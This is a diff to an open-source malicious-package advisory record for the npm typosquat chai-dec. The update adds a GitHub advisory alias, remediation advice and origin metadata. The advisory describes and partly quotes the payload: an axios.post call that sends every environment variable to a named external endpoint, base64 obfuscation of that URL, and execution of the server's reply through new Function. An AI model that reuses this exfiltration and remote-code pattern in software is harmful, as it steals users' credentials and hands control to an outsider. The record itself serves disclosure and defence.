@@ -1,10 +1,13 @@
 {
-  "modified": "2026-06-11T07:18:08Z",
+  "modified": "2026-07-06T18:55:50Z",
   "published": "2026-06-11T07:18:08Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-5606",
+  "aliases": [
+    "GHSA-782j-c8c3-2j5w"
+  ],
   "summary": "Malicious code in chai-dec (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5fbe1098e3267cf9e98fe2591e27b58f87fb44ca8c5475a5fde64fed8c2dd1c3)\nchai-dec impersonates the chai/pino ecosystem (package name rides on chai; package.json keywords and exports — `module.exports.pino = middleware` — masquerade as the pino logger). When the exported middleware factory is invoked (the standard Express-style usage), index.js spawns a detached Node child running lib/initializeCaller.js. That script POSTs the entire process.env object to https://ipcheck-hashed.vercel.app/api/auth/6c1d60d35852ef0c05df via `axios.post(apiEndpoint, {...process.env }, { headers: { 'x-secret-header': 'secret' } })`, leaking every environment variable on the consumer's machine (AWS/GitHub/npm tokens, DB credentials, CI secrets, etc.). The destination URL is hidden behind a base64 blob in a locally-shadowed `process.env.DEV_API_KEY` and decoded with `atob` at runtime to evade static review. The HTTP response body is then passed to `new Function('require', response.data)` and invoked with the real `require`, giving the operator of the endpoint arbitrary remote code execution in the consumer process with full Node privileges. This is a typosquat lure carrying a credential-harvest + dynamic-RCE payload.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5fbe1098e3267cf9e98fe2591e27b58f87fb44ca8c5475a5fde64fed8c2dd1c3)\nchai-dec impersonates the chai/pino ecosystem (package name rides on chai; package.json keywords and exports — `module.exports.pino = middleware` — masquerade as the pino logger). When the exported middleware factory is invoked (the standard Express-style usage), index.js spawns a detached Node child running lib/initializeCaller.js. That script POSTs the entire process.env object to https://ipcheck-hashed.vercel.app/api/auth/6c1d60d35852ef0c05df via `axios.post(apiEndpoint, {...process.env }, { headers: { 'x-secret-header': 'secret' } })`, leaking every environment variable on the consumer's machine (AWS/GitHub/npm tokens, DB credentials, CI secrets, etc.). The destination URL is hidden behind a base64 blob in a locally-shadowed `process.env.DEV_API_KEY` and decoded with `atob` at runtime to evade static review. The HTTP response body is then passed to `new Function('require', response.data)` and invoked with the real `require`, giving the operator of the endpoint arbitrary remote code execution in the consumer process with full Node privileges. This is a typosquat lure carrying a credential-harvest + dynamic-RCE payload.\n\n## Source: ghsa-malware (774328aa0da2fb1ffbd51817372f53e68a4406793a78122f549e5a34f12fead7)\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n",
   "affected": [
     {
       "package": {
@@ -16,6 +19,11 @@
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -52,6 +60,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/chai-dec/v/2.3.5"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-782j-c8c3-2j5w"
     }
   ],
   "credits": [
@@ -66,11 +78,21 @@
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-005693",
-        "import_time": "2026-06-11T07:49:41.792565932Z",
-        "modified_time": "2026-06-11T07:18:08Z",
-        "sha256": "5fbe1098e3267cf9e98fe2591e27b58f87fb44ca8c5475a5fde64fed8c2dd1c3",
         "source": "amazon-inspector",
+        "sha256": "5fbe1098e3267cf9e98fe2591e27b58f87fb44ca8c5475a5fde64fed8c2dd1c3",
+        "import_time": "2026-06-11T07:49:41.792565932Z",
+        "id": "IN-MAL-2026-005693",
+        "modified_time": "2026-06-11T07:18:08Z",
+        "versions": [
+          "2.3.5"
+        ]
+      },
+      {
+        "source": "ghsa-malware",
+        "sha256": "774328aa0da2fb1ffbd51817372f53e68a4406793a78122f549e5a34f12fead7",
+        "import_time": "2026-07-06T18:54:03.586901311Z",
+        "id": "GHSA-782j-c8c3-2j5w",
+        "modified_time": "2026-07-06T18:51:51Z",
         "versions": [
           "2.3.5"
         ]
